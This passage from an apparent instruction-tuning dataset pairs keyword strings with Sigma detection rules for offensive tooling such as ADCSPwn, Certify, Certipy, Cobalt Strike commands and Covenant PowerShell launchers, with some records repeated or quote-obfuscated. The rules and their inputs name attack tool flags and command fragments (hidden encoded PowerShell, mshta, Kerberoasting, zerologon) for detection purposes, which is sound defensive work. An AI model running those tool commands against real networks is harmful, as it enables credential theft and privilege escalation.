product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\hh.exe'\n        Image|endswith:\n            - '\\CertReq.exe'\n            - '\\CertUtil.exe'\n            - '\\cmd.exe'\n            - '\\cscript.exe'\n            - '\\installutil.exe'\n            - '\\MSbuild.exe'\n            - '\\MSHTA.EXE'\n            - '\\msiexec.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\regsvr32.exe'\n            - '\\rundll32.exe'\n            - '\\schtasks.exe'\n            - '\\wmic.exe'\n            - '\\wscript.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\hh.exe \\CertReq.exe \\CertUtil.exe \\cmd.exe \\cscript.exe \\installutil.exe \\MSbuild.exe \\MSHTA.EXE \\msiexec.exe \\powershell.exe \\pwsh.exe \\regsvr32.exe \\rundll32.exe \\schtasks.exe \\wmic.exe \\wscript.exe", "output": "title: HTML Help HH.EXE Suspicious Child Process\nid: 52cad028-0ff0-4854-8f67-d25dfcbc78b4\nstatus: test\ndescription: Detects a suspicious child process of a Microsoft HTML Help (HH.exe)\nreferences:\n    - https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/chm-badness-delivers-a-banking-trojan/\n    - https://github.com/elastic/protections-artifacts/commit/746086721fd385d9f5c6647cada1788db4aea95f#diff-27939090904026cc396b0b629c8e4314acd6f5dac40a676edbc87f4567b47eb7\n    - https://www.ptsecurity.com/ww-en/analytics/pt-esc-threat-intelligence/higaisa-or-winnti-apt-41-backdoors-old-and-new/\n    - https://www.zscaler.com/blogs/security-research/unintentional-leak-glimpse-attack-vectors-apt37\nauthor: Maxim Pavlunin, Nasreddine Bencherchali (Nextron Systems)\ndate: 2020-04-01\nmodified: 2023-04-12\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.initial-access\n    - attack.t1047\n    - attack.t1059.001\n    - attack.t1059.003\n    - attack.t1059.005\n    - attack.t1059.007\n    - attack.t1218\n    - attack.t1218.001\n    - attack.t1218.010\n    - attack.t1218.011\n    - attack.t1566\n    - attack.t1566.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\hh.exe'\n        Image|endswith:\n            - '\\CertReq.exe'\n            - '\\CertUtil.exe'\n            - '\\cmd.exe'\n            - '\\cscript.exe'\n            - '\\installutil.exe'\n            - '\\MSbuild.exe'\n            - '\\MSHTA.EXE'\n            - '\\msiexec.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\regsvr32.exe'\n            - '\\rundll32.exe'\n            - '\\schtasks.exe'\n            - '\\wmic.exe'\n            - '\\wscript.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "--adcs --port", "output": "title: HackTool - ADCSPwn Execution\nid: cd8c163e-a19b-402e-bdd5-419ff5859f12\nstatus: test\ndescription: Detects command line parameters used by ADCSPwn, a tool to escalate privileges in an active directory network by coercing authenticate from machine accounts and relaying to the certificate service\nreferences:\n    - https://github.com/bats3c/ADCSPwn\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-07-31\nmodified: 2023-02-04\ntags:\n    - attack.credential-access\n    - attack.t1557.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - ' --adcs '\n            - ' --port '\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "--adcs --p\\\"ort\\\"", "output": "title: HackTool - ADCSPwn Execution\nid: cd8c163e-a19b-402e-bdd5-419ff5859f12\nstatus: test\ndescription: Detects command line parameters used by ADCSPwn, a tool to escalate privileges in an active directory network by coercing authenticate from machine accounts and relaying to the certificate service\nreferences:\n    - https://github.com/bats3c/ADCSPwn\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-07-31\nmodified: 2023-02-04\ntags:\n    - attack.credential-access\n    - attack.t1557.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - ' --adcs '\n            - ' --port '\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "--adcs --port", "output": "title: HackTool - ADCSPwn Execution\nid: cd8c163e-a19b-402e-bdd5-419ff5859f12\nstatus: test\ndescription: Detects command line parameters used by ADCSPwn, a tool to escalate privileges in an active directory network by coercing authenticate from machine accounts and relaying to the certificate service\nreferences:\n    - https://github.com/bats3c/ADCSPwn\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-07-31\nmodified: 2023-02-04\ntags:\n    - attack.credential-access\n    - attack.t1557.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - ' --adcs '\n            - ' --port '\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "rundll32.exe .dll StartNodeRelay", "output": "title: HackTool - F-Secure C3 Load by Rundll32\nid: b18c9d4c-fac9-4708-bd06-dd5bfacf200f\nstatus: test\ndescription: F-Secure C3 produces DLLs with a default exported StartNodeRelay function.\nreferences:\n    - https://github.com/FSecureLABS/C3/blob/11a081fd3be2aaf2a879f6b6e9a96ecdd24966ef/Src/NodeRelayDll/NodeRelayDll.cpp#L12\nauthor: Alfie Champion (ajpc500)\ndate: 2021-06-02\nmodified: 2023-03-05\ntags:\n    - attack.defense-evasion\n    - attack.t1218.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'rundll32.exe'\n            - '.dll'\n            - 'StartNodeRelay'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical"}
{"instruction": "Write Sigma rule to detect payload:", "input": "rundll32.exe \".dll\" \"StartNodeRelay\"", "output": "title: HackTool - F-Secure C3 Load by Rundll32\nid: b18c9d4c-fac9-4708-bd06-dd5bfacf200f\nstatus: test\ndescription: F-Secure C3 produces DLLs with a default exported StartNodeRelay function.\nreferences:\n    - https://github.com/FSecureLABS/C3/blob/11a081fd3be2aaf2a879f6b6e9a96ecdd24966ef/Src/NodeRelayDll/NodeRelayDll.cpp#L12\nauthor: Alfie Champion (ajpc500)\ndate: 2021-06-02\nmodified: 2023-03-05\ntags:\n    - attack.defense-evasion\n    - attack.t1218.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'rundll32.exe'\n            - '.dll'\n            - 'StartNodeRelay'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical"}
{"instruction": "Write Sigma rule to detect payload:", "input": "rundll32 .dll StartNodeRelay", "output": "title: HackTool - F-Secure C3 Load by Rundll32\nid: b18c9d4c-fac9-4708-bd06-dd5bfacf200f\nstatus: test\ndescription: F-Secure C3 produces DLLs with a default exported StartNodeRelay function.\nreferences:\n    - https://github.com/FSecureLABS/C3/blob/11a081fd3be2aaf2a879f6b6e9a96ecdd24966ef/Src/NodeRelayDll/NodeRelayDll.cpp#L12\nauthor: Alfie Champion (ajpc500)\ndate: 2021-06-02\nmodified: 2023-03-05\ntags:\n    - attack.defense-evasion\n    - attack.t1218.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'rundll32.exe'\n            - '.dll'\n            - 'StartNodeRelay'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical"}
{"instruction": "Write Sigma rule to detect payload:", "input": "rundll32.exe StartNodeRelay .dll", "output": "title: HackTool - F-Secure C3 Load by Rundll32\nid: b18c9d4c-fac9-4708-bd06-dd5bfacf200f\nstatus: test\ndescription: F-Secure C3 produces DLLs with a default exported StartNodeRelay function.\nreferences:\n    - https://github.com/FSecureLABS/C3/blob/11a081fd3be2aaf2a879f6b6e9a96ecdd24966ef/Src/NodeRelayDll/NodeRelayDll.cpp#L12\nauthor: Alfie Champion (ajpc500)\ndate: 2021-06-02\nmodified: 2023-03-05\ntags:\n    - attack.defense-evasion\n    - attack.t1218.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'rundll32.exe'\n            - '.dll'\n            - 'StartNodeRelay'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\Certify.exe Certify.exe Certify .exe cas .exe find .exe pkiobjects .exe request .exe download /vulnerable /template: /altname: /domain: /path: /ca:", "output": "title: HackTool - Certify Execution\nid: 762f2482-ff21-4970-8939-0aa317a886bb\nstatus: test\ndescription: Detects Certify a tool for Active Directory certificate abuse based on PE metadata characteristics and common command line arguments.\nreferences:\n    - https://github.com/GhostPack/Certify\nauthor: pH-T (Nextron Systems)\ndate: 2023-04-17\nmodified: 2023-04-25\ntags:\n    - attack.discovery\n    - attack.credential-access\n    - attack.t1649\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\Certify.exe'\n        - OriginalFileName: 'Certify.exe'\n        - Description|contains: 'Certify'\n    selection_cli_commands:\n        CommandLine|contains:\n            - '.exe cas '\n            - '.exe find '\n            - '.exe pkiobjects '\n            - '.exe request '\n            - '.exe download '\n    selection_cli_options:\n        CommandLine|contains:\n            - ' /vulnerable'\n            - ' /template:'\n            - ' /altname:'\n            - ' /domain:'\n            - ' /path:'\n            - ' /ca:'\n    condition: selection_img or all of selection_cli_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\Certify.exe Certify.exe Certify .exe cas .exe find \".exe\" pkiobjects .exe request .exe download /vulnerable /template: /altname: /domain: /path: /ca:", "output": "title: HackTool - Certify Execution\nid: 762f2482-ff21-4970-8939-0aa317a886bb\nstatus: test\ndescription: Detects Certify a tool for Active Directory certificate abuse based on PE metadata characteristics and common command line arguments.\nreferences:\n    - https://github.com/GhostPack/Certify\nauthor: pH-T (Nextron Systems)\ndate: 2023-04-17\nmodified: 2023-04-25\ntags:\n    - attack.discovery\n    - attack.credential-access\n    - attack.t1649\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\Certify.exe'\n        - OriginalFileName: 'Certify.exe'\n        - Description|contains: 'Certify'\n    selection_cli_commands:\n        CommandLine|contains:\n            - '.exe cas '\n            - '.exe find '\n            - '.exe pkiobjects '\n            - '.exe request '\n            - '.exe download '\n    selection_cli_options:\n        CommandLine|contains:\n            - ' /vulnerable'\n            - ' /template:'\n            - ' /altname:'\n            - ' /domain:'\n            - ' /path:'\n            - ' /ca:'\n    condition: selection_img or all of selection_cli_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\Certify Certify Certify cas find pkiobjects request download /vulnerable /template: /altname: /domain: /path: /ca:", "output": "title: HackTool - Certify Execution\nid: 762f2482-ff21-4970-8939-0aa317a886bb\nstatus: test\ndescription: Detects Certify a tool for Active Directory certificate abuse based on PE metadata characteristics and common command line arguments.\nreferences:\n    - https://github.com/GhostPack/Certify\nauthor: pH-T (Nextron Systems)\ndate: 2023-04-17\nmodified: 2023-04-25\ntags:\n    - attack.discovery\n    - attack.credential-access\n    - attack.t1649\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\Certify.exe'\n        - OriginalFileName: 'Certify.exe'\n        - Description|contains: 'Certify'\n    selection_cli_commands:\n        CommandLine|contains:\n            - '.exe cas '\n            - '.exe find '\n            - '.exe pkiobjects '\n            - '.exe request '\n            - '.exe download '\n    selection_cli_options:\n        CommandLine|contains:\n            - ' /vulnerable'\n            - ' /template:'\n            - ' /altname:'\n            - ' /domain:'\n            - ' /path:'\n            - ' /ca:'\n    condition: selection_img or all of selection_cli_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\Certify.exe Certify.exe Certify .exe cas .exe find .exe pkiobjects .exe request .exe download /vulnerable /template: /altname: /domain: /path: /ca:", "output": "title: HackTool - Certify Execution\nid: 762f2482-ff21-4970-8939-0aa317a886bb\nstatus: test\ndescription: Detects Certify a tool for Active Directory certificate abuse based on PE metadata characteristics and common command line arguments.\nreferences:\n    - https://github.com/GhostPack/Certify\nauthor: pH-T (Nextron Systems)\ndate: 2023-04-17\nmodified: 2023-04-25\ntags:\n    - attack.discovery\n    - attack.credential-access\n    - attack.t1649\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\Certify.exe'\n        - OriginalFileName: 'Certify.exe'\n        - Description|contains: 'Certify'\n    selection_cli_commands:\n        CommandLine|contains:\n            - '.exe cas '\n            - '.exe find '\n            - '.exe pkiobjects '\n            - '.exe request '\n            - '.exe download '\n    selection_cli_options:\n        CommandLine|contains:\n            - ' /vulnerable'\n            - ' /template:'\n            - ' /altname:'\n            - ' /domain:'\n            - ' /path:'\n            - ' /ca:'\n    condition: selection_img or all of selection_cli_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\Certipy.exe Certipy.exe Certipy account auth cert find forge ptt relay req shadow template -bloodhound -ca-pfx -dc-ip -kirbi -old-bloodhound -pfx -target -template -username -vulnerable auth -pfx shadow auto shadow list", "output": "title: HackTool - Certipy Execution\nid: 6938366d-8954-4ddc-baff-c830b3ba8fcd\nstatus: test\ndescription: |\n    Detects Certipy execution, a tool for Active Directory Certificate Services enumeration and abuse based on PE metadata characteristics and common command line arguments.\nreferences:\n    - https://github.com/ly4k/Certipy\n    - https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7\nauthor: pH-T (Nextron Systems), Sittikorn Sangrattanapitak\ndate: 2023-04-17\nmodified: 2024-10-08\ntags:\n    - attack.discovery\n    - attack.credential-access\n    - attack.t1649\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\Certipy.exe'\n        - OriginalFileName: 'Certipy.exe'\n        - Description|contains: 'Certipy'\n    selection_cli_commands:\n        CommandLine|contains:\n            - ' account '\n            - ' auth '\n            # - ' ca ' # Too short to be used with just one CLI\n            - ' cert '\n            - ' find '\n            - ' forge '\n            - ' ptt '\n            - ' relay '\n            - ' req '\n            - ' shadow '\n            - ' template '\n    selection_cli_flags:\n        CommandLine|contains:\n            - ' -bloodhound'\n            - ' -ca-pfx '\n            - ' -dc-ip '\n            - ' -kirbi'\n            - ' -old-bloodhound'\n            - ' -pfx '\n            - ' -target'\n            - ' -template'\n            - ' -username '\n            - ' -vulnerable'\n            - 'auth -pfx'\n            - 'shadow auto'\n            - 'shadow list'\n    condition: selection_img or all of selection_cli_*\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\Certipy.exe Certipy.exe Certipy account auth cert find forge ptt relay req shadow template \\\"-bloodhound\\\" -ca-pfx -dc-ip -kirbi -old-bloodhound -pfx -target -template -username -vulnerable auth -pfx shadow auto shadow list", "output": "title: HackTool - Certipy Execution\nid: 6938366d-8954-4ddc-baff-c830b3ba8fcd\nstatus: test\ndescription: |\n    Detects Certipy execution, a tool for Active Directory Certificate Services enumeration and abuse based on PE metadata characteristics and common command line arguments.\nreferences:\n    - https://github.com/ly4k/Certipy\n    - https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7\nauthor: pH-T (Nextron Systems), Sittikorn Sangrattanapitak\ndate: 2023-04-17\nmodified: 2024-10-08\ntags:\n    - attack.discovery\n    - attack.credential-access\n    - attack.t1649\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\Certipy.exe'\n        - OriginalFileName: 'Certipy.exe'\n        - Description|contains: 'Certipy'\n    selection_cli_commands:\n        CommandLine|contains:\n            - ' account '\n            - ' auth '\n            # - ' ca ' # Too short to be used with just one CLI\n            - ' cert '\n            - ' find '\n            - ' forge '\n            - ' ptt '\n            - ' relay '\n            - ' req '\n            - ' shadow '\n            - ' template '\n    selection_cli_flags:\n        CommandLine|contains:\n            - ' -bloodhound'\n            - ' -ca-pfx '\n            - ' -dc-ip '\n            - ' -kirbi'\n            - ' -old-bloodhound'\n            - ' -pfx '\n            - ' -target'\n            - ' -template'\n            - ' -username '\n            - ' -vulnerable'\n            - 'auth -pfx'\n            - 'shadow auto'\n            - 'shadow list'\n    condition: selection_img or all of selection_cli_*\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\Certipy Certipy Certipy account auth cert find forge ptt relay req shadow template -bloodhound -ca-pfx -dc-ip -kirbi -old-bloodhound -pfx -target -template -username -vulnerable auth -pfx shadow auto shadow list", "output": "title: HackTool - Certipy Execution\nid: 6938366d-8954-4ddc-baff-c830b3ba8fcd\nstatus: test\ndescription: |\n    Detects Certipy execution, a tool for Active Directory Certificate Services enumeration and abuse based on PE metadata characteristics and common command line arguments.\nreferences:\n    - https://github.com/ly4k/Certipy\n    - https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7\nauthor: pH-T (Nextron Systems), Sittikorn Sangrattanapitak\ndate: 2023-04-17\nmodified: 2024-10-08\ntags:\n    - attack.discovery\n    - attack.credential-access\n    - attack.t1649\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\Certipy.exe'\n        - OriginalFileName: 'Certipy.exe'\n        - Description|contains: 'Certipy'\n    selection_cli_commands:\n        CommandLine|contains:\n            - ' account '\n            - ' auth '\n            # - ' ca ' # Too short to be used with just one CLI\n            - ' cert '\n            - ' find '\n            - ' forge '\n            - ' ptt '\n            - ' relay '\n            - ' req '\n            - ' shadow '\n            - ' template '\n    selection_cli_flags:\n        CommandLine|contains:\n            - ' -bloodhound'\n            - ' -ca-pfx '\n            - ' -dc-ip '\n            - ' -kirbi'\n            - ' -old-bloodhound'\n            - ' -pfx '\n            - ' -target'\n            - ' -template'\n            - ' -username '\n            - ' -vulnerable'\n            - 'auth -pfx'\n            - 'shadow auto'\n            - 'shadow list'\n    condition: selection_img or all of selection_cli_*\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\Certipy.exe Certipy.exe Certipy account auth cert find forge ptt relay req shadow template -bloodhound -ca-pfx -dc-ip -kirbi -old-bloodhound -pfx -target -template -username -vulnerable auth -pfx shadow auto shadow list", "output": "title: HackTool - Certipy Execution\nid: 6938366d-8954-4ddc-baff-c830b3ba8fcd\nstatus: test\ndescription: |\n    Detects Certipy execution, a tool for Active Directory Certificate Services enumeration and abuse based on PE metadata characteristics and common command line arguments.\nreferences:\n    - https://github.com/ly4k/Certipy\n    - https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7\nauthor: pH-T (Nextron Systems), Sittikorn Sangrattanapitak\ndate: 2023-04-17\nmodified: 2024-10-08\ntags:\n    - attack.discovery\n    - attack.credential-access\n    - attack.t1649\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\Certipy.exe'\n        - OriginalFileName: 'Certipy.exe'\n        - Description|contains: 'Certipy'\n    selection_cli_commands:\n        CommandLine|contains:\n            - ' account '\n            - ' auth '\n            # - ' ca ' # Too short to be used with just one CLI\n            - ' cert '\n            - ' find '\n            - ' forge '\n            - ' ptt '\n            - ' relay '\n            - ' req '\n            - ' shadow '\n            - ' template '\n    selection_cli_flags:\n        CommandLine|contains:\n            - ' -bloodhound'\n            - ' -ca-pfx '\n            - ' -dc-ip '\n            - ' -kirbi'\n            - ' -old-bloodhound'\n            - ' -pfx '\n            - ' -target'\n            - ' -template'\n            - ' -username '\n            - ' -vulnerable'\n            - 'auth -pfx'\n            - 'shadow auto'\n            - 'shadow list'\n    condition: selection_img or all of selection_cli_*\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "Cmd.Exe \\cmd.exe Invoke-UserHunter Invoke-ShareFinder Invoke-Kerberoast Invoke-SMBAutoBrute Invoke-Nightmare zerologon av_query", "output": "title: Operator Bloopers Cobalt Strike Modules\nid: 4f154fb6-27d1-4813-a759-78b93e0b9c48\nrelated:\n    - id: 647c7b9e-d784-4fda-b9a0-45c565a7b729\n      type: similar\nstatus: test\ndescription: Detects Cobalt Strike module/commands accidentally entered in CMD shell\nreferences:\n    - https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/cobalt-4-5-user-guide.pdf\n    - https://thedfirreport.com/2021/10/04/bazarloader-and-the-conti-leaks/\n    - https://thedfirreport.com/2022/06/16/sans-ransomware-summit-2022-can-you-detect-this/\nauthor: _pete_0, TheDFIRReport\ndate: 2022-05-06\nmodified: 2023-01-30\ntags:\n    - attack.execution\n    - attack.t1059.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName: 'Cmd.Exe'\n        - Image|endswith: '\\cmd.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'Invoke-UserHunter'\n            - 'Invoke-ShareFinder'\n            - 'Invoke-Kerberoast'\n            - 'Invoke-SMBAutoBrute'\n            - 'Invoke-Nightmare'\n            - 'zerologon'\n            - 'av_query'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "Cmd.Exe \\cmd.exe Invoke-UserHunter Invoke-ShareFinder Invoke-Kerberoast Invoke-SM\\\"BAutoBrute\\\" Invoke-Nightmare zerologon av_query", "output": "title: Operator Bloopers Cobalt Strike Modules\nid: 4f154fb6-27d1-4813-a759-78b93e0b9c48\nrelated:\n    - id: 647c7b9e-d784-4fda-b9a0-45c565a7b729\n      type: similar\nstatus: test\ndescription: Detects Cobalt Strike module/commands accidentally entered in CMD shell\nreferences:\n    - https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/cobalt-4-5-user-guide.pdf\n    - https://thedfirreport.com/2021/10/04/bazarloader-and-the-conti-leaks/\n    - https://thedfirreport.com/2022/06/16/sans-ransomware-summit-2022-can-you-detect-this/\nauthor: _pete_0, TheDFIRReport\ndate: 2022-05-06\nmodified: 2023-01-30\ntags:\n    - attack.execution\n    - attack.t1059.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName: 'Cmd.Exe'\n        - Image|endswith: '\\cmd.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'Invoke-UserHunter'\n            - 'Invoke-ShareFinder'\n            - 'Invoke-Kerberoast'\n            - 'Invoke-SMBAutoBrute'\n            - 'Invoke-Nightmare'\n            - 'zerologon'\n            - 'av_query'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "Cmd \\cmd Invoke-UserHunter Invoke-ShareFinder Invoke-Kerberoast Invoke-SMBAutoBrute Invoke-Nightmare zerologon av_query", "output": "title: Operator Bloopers Cobalt Strike Modules\nid: 4f154fb6-27d1-4813-a759-78b93e0b9c48\nrelated:\n    - id: 647c7b9e-d784-4fda-b9a0-45c565a7b729\n      type: similar\nstatus: test\ndescription: Detects Cobalt Strike module/commands accidentally entered in CMD shell\nreferences:\n    - https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/cobalt-4-5-user-guide.pdf\n    - https://thedfirreport.com/2021/10/04/bazarloader-and-the-conti-leaks/\n    - https://thedfirreport.com/2022/06/16/sans-ransomware-summit-2022-can-you-detect-this/\nauthor: _pete_0, TheDFIRReport\ndate: 2022-05-06\nmodified: 2023-01-30\ntags:\n    - attack.execution\n    - attack.t1059.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName: 'Cmd.Exe'\n        - Image|endswith: '\\cmd.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'Invoke-UserHunter'\n            - 'Invoke-ShareFinder'\n            - 'Invoke-Kerberoast'\n            - 'Invoke-SMBAutoBrute'\n            - 'Invoke-Nightmare'\n            - 'zerologon'\n            - 'av_query'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "Cmd.Exe \\cmd.exe Invoke-UserHunter Invoke-ShareFinder Invoke-Kerberoast Invoke-SMBAutoBrute Invoke-Nightmare zerologon av_query", "output": "title: Operator Bloopers Cobalt Strike Modules\nid: 4f154fb6-27d1-4813-a759-78b93e0b9c48\nrelated:\n    - id: 647c7b9e-d784-4fda-b9a0-45c565a7b729\n      type: similar\nstatus: test\ndescription: Detects Cobalt Strike module/commands accidentally entered in CMD shell\nreferences:\n    - https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/cobalt-4-5-user-guide.pdf\n    - https://thedfirreport.com/2021/10/04/bazarloader-and-the-conti-leaks/\n    - https://thedfirreport.com/2022/06/16/sans-ransomware-summit-2022-can-you-detect-this/\nauthor: _pete_0, TheDFIRReport\ndate: 2022-05-06\nmodified: 2023-01-30\ntags:\n    - attack.execution\n    - attack.t1059.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName: 'Cmd.Exe'\n        - Image|endswith: '\\cmd.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'Invoke-UserHunter'\n            - 'Invoke-ShareFinder'\n            - 'Invoke-Kerberoast'\n            - 'Invoke-SMBAutoBrute'\n            - 'Invoke-Nightmare'\n            - 'zerologon'\n            - 'av_query'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "-Sta -Nop -Window Hidden -Command -EncodedCommand sv o (New-Object IO.MemorySteam);sv d mshta file.hta GruntHTTP -EncodedCommand cwB2ACAAbwAgA", "output": "title: HackTool - Covenant PowerShell Launcher\nid: c260b6db-48ba-4b4a-a76f-2f67644e99d2\nstatus: test\ndescription: Detects suspicious command lines used in Covenant luanchers\nreferences:\n    - https://posts.specterops.io/covenant-v0-5-eee0507b85ba\nauthor: Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community\ndate: 2020-06-04\nmodified: 2023-02-21\ntags:\n    - attack.execution\n    - attack.defense-evasion\n    - attack.t1059.001\n    - attack.t1564.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_1:\n        CommandLine|contains|all:\n            - '-Sta'\n            - '-Nop'\n            - '-Window'\n            - 'Hidden'\n        CommandLine|contains:\n            - '-Command'\n            - '-EncodedCommand'\n    selection_2:\n        CommandLine|contains:\n            - 'sv o (New-Object IO.MemorySteam);sv d '\n            - 'mshta file.hta'\n            - 'GruntHTTP'\n            - '-EncodedCommand cwB2ACAAbwAgA'\n    condition: 1 of selection_*\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "-Sta -Nop -Window Hidden \\\"-\\\"\\\"C\\\"\\\"o\\\"\\\"m\\\"\\\"m\\\"\\\"a\\\"\\\"n\\\"\\\"d\\\" -EncodedCommand sv o (New-Object IO.MemorySteam);sv d mshta file.hta GruntHTTP -EncodedCommand cwB2ACAAbwAgA", "output": "title: HackTool - Covenant PowerShell Launcher\nid: c260b6db-48ba-4b4a-a76f-2f67644e99d2\nstatus: test\ndescription: Detects suspicious command lines used in Covenant luanchers\nreferences:\n    - https://posts.specterops.io/covenant-v0-5-eee0507b85ba\nauthor: Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community\ndate: 2020-06-04\nmodified: 2023-02-21\ntags:\n    - attack.execution\n    - attack.defense-evasion\n    - attack.t1059.001\n    - attack.t1564.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_1:\n        CommandLine|contains|all:\n            - '-Sta'\n            - '-Nop'\n            - '-Window'\n            - 'Hidden'\n        CommandLine|contains:\n            - '-Command'\n            - '-EncodedCommand'\n    selection_2:\n        CommandLine|contains:\n            - 'sv o (New-Object IO.MemorySteam);sv d '\n            - 'mshta file.hta'\n            - 'GruntHTTP'\n            - '-EncodedCommand cwB2ACAAbwAgA'\n    condition: 1 of selection_*\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "-Sta -Nop -Window Hidden -Command -EncodedCommand sv o (New-Object IO.MemorySteam);sv d mshta file.hta GruntHTTP -EncodedCommand cwB2ACAAbwAgA", "output": "title: HackTool - Covenant PowerShell Launcher\nid: c260b6db-48ba-4b4a-a76f-2f67644e99d2\nstatus: test\ndescription: Detects suspicious command lines used in Covenant luanchers\nreferences:\n    - https://posts.specterops.io/covenant-v0-5-eee0507b85ba\nauthor: Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community\ndate: 2020-06-04\nmodified: 2023-02-21\ntags:\n    - attack.execution\n    - attack.defense-evasion\n    - attack.t1059.001\n    - attack.t1564.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_1:\n        CommandLine|contains|all:\n            - '-Sta'\n            - '-Nop'\n            - '-Window'\n            - 'Hidden'\n        CommandLine|contains:\n            - '-Command'\n            - '-EncodedCommand'\n    selection_2:\n        CommandLine|contains:\n            - 'sv o (New-Object IO.MemorySteam);sv d '\n            - 'mshta file.hta'\n            - 'GruntHTTP'\n            - '-EncodedCommand cwB2ACAAbwAgA'\n    condition: 1 of selection_*\nlevel: high"}
